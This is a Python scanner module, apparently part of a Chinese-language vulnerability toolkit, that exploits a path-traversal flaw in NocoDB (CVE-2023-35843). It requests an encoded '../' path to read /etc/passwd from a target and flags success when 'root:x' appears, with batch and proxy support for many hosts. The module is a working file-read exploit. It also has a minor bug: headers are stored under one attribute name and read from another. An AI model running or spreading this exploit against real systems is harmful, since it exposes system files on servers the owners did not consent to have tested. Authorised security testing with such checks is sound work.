#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2023_35843:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
        try:
            req = requests.get(url2,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("NocoDB", f"存在NocoDB任意文件读取漏洞 {url2}")

                if self.batch:
                    OutPutFile("NocoDB",f"存在NocoDB任意文件读取漏洞 {url2}")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NocoDB", f"不存在NocoDB 任意文件读取漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NocoDB", "不存在NocoDB 任意文件读取漏洞")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("NocoDB", "开始检测NocoDB 任意文件读取漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("NocoDB", "NocoDB 任意文件读取漏洞检测结束")
